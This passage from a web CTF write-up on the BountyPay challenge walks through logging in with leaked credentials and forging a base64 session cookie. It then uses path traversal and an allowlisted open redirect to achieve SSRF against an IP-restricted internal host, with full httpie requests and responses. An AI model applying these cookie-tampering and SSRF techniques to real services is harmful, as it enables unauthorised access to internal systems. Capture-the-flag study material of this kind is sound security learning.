<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="na">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="na">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="na">Referer</span><span class="o">:</span> <span class="l">https://app.bountypay.h1ctf.com/</span>
<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-GB,en-US;q=0.9,en;q=0.8</span>
<a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>
<a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="nt">username</span><span class="o">=</span><span class="s">brian.oliver</span><span class="p">&amp;</span><span class="nt">password</span><span class="o">=</span><span class="s">V7h0inzX</span><span class="p">&amp;</span><span class="nt">challenge</span><span class="o">=</span><span class="s">8718040845a881ff0da135418b2811b2</span><span class="p">&amp;</span><span class="nt">challenge_answer</span><span class="o">=</span><span class="s">V7h0inzX</span>
</code></pre></div>
<p>We can see that there is an extra parameter named <code>challenge</code> . The value appears to be an MD5 hash. The hash is different after each login request. After a bit of trial and error we can guess that the <code>challenge</code> should be an MD5 hash of the <code>challenge_answer</code>. When this is the case we can successfully login ! 🥳</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>http -f post https://app.bountypay.h1ctf.com \
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>username=brian.oliver \
<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>password=V7h0inzX \
<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>challenge=5828c689761cce705a1c84d9b1a1ed5e \
<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>challenge_answer=bD83Jk27dQ
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 04 Jun 2020 16:51:11 GMT</span>
<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="na">Location</span><span class="o">:</span> <span class="l">/</span>
<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.0 (Ubuntu)</span>
<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="na">Set-Cookie</span><span class="o">:</span> <span class="l">token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Sat, 04-Jul-2020 16:51:11 GMT; Max-Age=2592000</span>
<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
</code></pre></div>
<p><img alt="BountyPay | Dashboard" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2019.24.23.png" /></p>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>We can note that the <code>challenge</code> parameter has been omitted in the log file, probably to make this step a little bit harder.</p>
</div>
<h2 id="server-side-request-forgery">Server Side Request Forgery<a class="headerlink" href="#server-side-request-forgery" title="Permanent link">&para;</a></h2>
<p>Once we are logged in there is not much we can do except for loading transactions for our account.</p>
<p><img alt="BountyPay | Dashboard" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2019.24.23.png" /></p>
<p>Loading the transactions:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>http get https://app.bountypay.h1ctf.com/statements\?month\=02\&amp;year\=2020 \
<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>Cookie:&#39;token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9&#39;
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 04 Jun 2020 16:54:38 GMT</span>
<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.0 (Ubuntu)</span>
<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>
<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="p">{</span>
<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="w">    </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;{\&quot;description\&quot;:\&quot;Transactions for 2020-02\&quot;,\&quot;transactions\&quot;:[]}&quot;</span><span class="p">,</span>
<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a><span class="w">    </span><span class="nt">&quot;url&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=02&amp;year=2020&quot;</span>
<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a><span class="p">}</span>
</code></pre></div>
<p>The response contains two interesting piece of information. The transaction data, our account does not appear to have access to any transactions, and a <code>url</code> which seems to indicate that the server is actually making a request to  api.bountypay.h1ctf.com.</p>
<p>If we look into the JavaScript files we can also see that there is an endpoint that is used to pay transactions:</p>
<div class="highlight"><span class="filename">/js/app.js</span><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;.loadTxns&quot;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;select[name=&quot;month&quot;]&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">(),</span>
<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="w">    </span><span class="nx">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;select[name=&quot;year&quot;]&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="w">  </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;.txn-panel&quot;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">),</span><span class="w"> </span><span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&quot;/statements?month=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;&amp;year=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">e</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="w">      </span><span class="kd">let</span><span class="w"> </span><span class="nx">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="s2">&quot;transactions&quot;</span><span class="p">))</span>
<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="mf">0</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">transactions</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;.txn-panel&quot;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">&#39;&lt;div class=&quot;text-center&quot; style=&quot;margin:10px&quot;&gt;No Transactions To Process&lt;/div&gt;&#39;</span><span class="p">);</span>
<a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="w">          </span><span class="kd">let</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">;</span>
<a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a><span class="w">          </span><span class="nx">t</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s1">&#39;&lt;table style=&quot;margin:0&quot; class=&quot;table&quot;&gt;&lt;tr&gt;&lt;th&gt;Hacker(s)&lt;/th&gt;&lt;th class=&quot;text-center&quot;&gt;Program(s)&lt;/th&gt;&lt;th class=&quot;text-center&quot;&gt;Reports(s)&lt;/th&gt;&lt;th class=&quot;text-center&quot;&gt;Pay Out&lt;/th&gt;&lt;th class=&quot;text-center&quot;&gt;Action&lt;/th&gt;&lt;/tr&gt;&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">$</span><span class="p">.</span><span class="nx">each</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">transactions</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="w"> </span><span class="nx">s</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a><span class="w">            </span><span class="nx">t</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">hackers</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;&lt;/td&gt;&lt;td class=&quot;text-center&quot;&gt;&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">programs</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;&lt;/td&gt;&lt;td class=&quot;text-center&quot;&gt;&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">reports</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;&lt;/td&gt;&lt;td class=&quot;text-center&quot;&gt;&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">amount</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;&lt;/td&gt;&lt;td class=&quot;text-center&quot;&gt;&lt;a href=&quot;/pay/&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">id</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;/&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">hash</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;&quot; class=&quot;btn btn-sm btn-success&quot;&gt;Pay&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span>
<a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a><span class="w">          </span><span class="p">}),</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;.txn-panel&quot;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span>
<a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a><span class="w">        </span><span class="p">}</span>
<a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a><span class="w">      </span><span class="k">else</span><span class="w"> </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Invalid Response From The Server&quot;</span><span class="p">)</span>
<a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Invalid Response From The Server&quot;</span><span class="p">)</span>
<a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a><span class="w">  </span><span class="p">})</span>
<a id="__codelineno-20-18" name="__codelineno-20-18" href="#__codelineno-20-18"></a><span class="p">});</span>
</code></pre></div>
<p>If we try to guess the <code>id</code> and <code>hash</code> for the <code>GET /pay/{id}/{hash}</code> endpoint we get an error from the server: <code>Invalid payment details</code>. Let's leave this endpoint for now and focus on the retrieval of transactions.</p>
<p>Looking back at the response for the transaction retrieval request we can assume that the application is making an HTTP request to the <code>url</code> parameter. After some testing it appears that <code>month</code> and <code>year</code> parameter are not vulnerable.</p>
<p>Something we did not check yet is the content of our session cookie:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
</code></pre></div>
<p>The beggining of the string <code>eyJ</code> is characteristic of base64 JSON encoded data. Let's see what's inside:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="p">{</span>
<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="w">  </span><span class="nt">&quot;account_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;F8gHiqSdpK&quot;</span><span class="p">,</span>
<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="w">  </span><span class="nt">&quot;hash&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;de235bffd23df6995ad4e0930baac1a2&quot;</span>
<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="p">}</span>
</code></pre></div>
<p>We can see that our session cookie contains the <code>account_id</code> which is present in the URL used to retrieve the transactions. If our assumptions is correct this means that we can manipulate the URL used to retrieve the transactions. Without another <code>account_id</code> we can't test for IDOR but we might be able to manipulate the request.</p>
<p>If we set the value of the token cookie to <code>../accounts/F8gHiqSdpK</code> ,we can see that the reponse is identical which means that we currently have an SSRF that is limited to the app.bountypay.h1ctf.com subdomain.</p>
<p>One way to augment the impact of an SSRF is to use an open redirect to be able to target non whitelisted domains or in our case a domain that is not app.bountypay.h1ctf.com. If we look back at the notes taken during the passive reconnaissance phase, there is one feature that might be useful.</p>
<p>On api.bountypay.h1ctf.com there is a link to Google Search that is not a simple link. Let's look at the request:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>http get &quot;https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API&quot;
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 04 Jun 2020 16:57:33 GMT</span>
<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="na">Location</span><span class="o">:</span> <span class="l">https://www.google.com/search?q=REST API</span>
<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.0 (Ubuntu)</span>
<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
</code></pre></div>
<p>The problem is that there is an allowlist which appear to only accept a URL that starts with <code>https://www.google.com/search?q=</code>. Otherwise we get an error, either <code>URL NOT FOUND IN WHITELIST</code> or <code>URL must begin with either http:// or https://</code>.</p>
<p>My initial idea was that if we can bypass the allowlist we could send the request to a server under our control which would allow us to intercept some potentially interesting headers or cookies. After multiple failed attemps it appeared that it was not possible to bypass the allowlist.</p>
<p>If we cannot bypass the controls in place, maybe we can find other urls present in the allowlist. It turns out that both <code>https://staff.bountypay.h1ctf.com/</code> and <code>https://software.bountypay.h1ctf.com/</code> are accepted ! Which means that we can bypass the IP restriction on software.bountypay.h1ctf.com.</p>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>I ended spending way more time on this step since when I first tested this I did not add the <code>/</code> at the end of the URL resulting in a URL <code>NOT FOUND IN WHITELIST</code> error 😢. The cool part is that because of that I went down a rabbit hole thinking that there might an open redirect on www.google.com. Turns out there are some but they were not exploitable since the whitelisted URL needed to end with <code>search?q=.</code></p>
</div>
<p>Let's set <code>../../redirect?url=https://software.bountypay.h1ctf.com/#</code> as our account id and see what happens:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="p">{</span>
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="w">  </span><span class="nt">&quot;account_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;../../redirect?url=https://software.bountypay.h1ctf.com/&quot;</span><span class="p">,</span>
<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="w">  </span><span class="nt">&quot;hash&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;de235bffd23df6995ad4e0930baac1a2&quot;</span>
<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="p">}</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>http get https://app.bountypay.h1ctf.com/statements\?month\=02\&amp;year\=2020 \
<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>Cookie:&#39;token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS8jIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0=&#39;
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 04 Jun 2020 17:10:40 GMT</span>
<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.0 (Ubuntu)</span>
<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>
<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="p">{</span>
<a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a><span class="w">    </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&lt;!DOCTYPE html&gt;\n&lt;html lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset=\&quot;utf-8\&quot;&gt;\n    &lt;meta http-equiv=\&quot;X-UA-Compatible\&quot; content=\&quot;IE=edge\&quot;&gt;\n    &lt;meta name=\&quot;viewport\&quot; content=\&quot;width=device-width, initial-scale=1\&quot;&gt;\n    &lt;title&gt;Software Storage&lt;/title&gt;\n    &lt;link href=\&quot;/css/bootstrap.min.css\&quot; rel=\&quot;stylesheet\&quot;&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;div class=\&quot;container\&quot;&gt;\n    &lt;div class=\&quot;row\&quot;&gt;\n        &lt;div class=\&quot;col-sm-6 col-sm-offset-3\&quot;&gt;\n            &lt;h1 style=\&quot;text-align: center\&quot;&gt;Software Storage&lt;/h1&gt;\n            &lt;form method=\&quot;post\&quot; action=\&quot;/\&quot;&gt;\n                &lt;div class=\&quot;panel panel-default\&quot; style=\&quot;margin-top:50px\&quot;&gt;\n                    &lt;div class=\&quot;panel-heading\&quot;&gt;Login&lt;/div&gt;\n                    &lt;div class=\&quot;panel-body\&quot;&gt;\n                        &lt;div style=\&quot;margin-top:7px\&quot;&gt;&lt;label&gt;Username:&lt;/label&gt;&lt;/div&gt;\n                        &lt;div&gt;&lt;input name=\&quot;username\&quot; class=\&quot;form-control\&quot;&gt;&lt;/div&gt;\n                        &lt;div style=\&quot;margin-top:7px\&quot;&gt;&lt;label&gt;Password:&lt;/label&gt;&lt;/div&gt;\n                        &lt;div&gt;&lt;input name=\&quot;password\&quot; type=\&quot;password\&quot; class=\&quot;form-control\&quot;&gt;&lt;/div&gt;\n                    &lt;/div&gt;\n                &lt;/div&gt;\n                &lt;input type=\&quot;submit\&quot; class=\&quot;btn btn-success pull-right\&quot; value=\&quot;Login\&quot;&gt;\n            &lt;/form&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n&lt;script src=\&quot;/js/jquery.min.js\&quot;&gt;&lt;/script&gt;\n&lt;script src=\&quot;/js/bootstrap.min.js\&quot;&gt;&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;&quot;</span><span class="p">,</span>
<a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a><span class="w">    </span><span class="nt">&quot;url&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://api.bountypay.h1ctf.com/api/accounts/../../redirect?url=https://software.bountypay.h1ctf.com/#/statements?month=02&amp;year=2020&quot;</span>
<a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a><span class="p">}</span>
</code></pre></div>
<p>The data now contains the HTML content of the software.bountypay.h1ctf index page which is a login form:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="cp">&lt;!DOCTYPE html&gt;</span>
<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&quot;en&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;utf-8&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&quot;X-UA-Compatible&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;IE=edge&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;viewport&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;width=device-width, initial-scale=1&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Software Storage<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/css/bootstrap.min.css&quot;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>
<a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a>    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;container&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a>    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;row&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-28-14" name="__codelineno-28-14" href="#__codelineno-28-14"></a>        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;col-sm-6 col-sm-offset-3&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-28-15" name="__codelineno-28-15" href="#__codelineno-28-15"></a>            <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;text-align: center&quot;</span><span class="p">&gt;</span>Software Storage<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
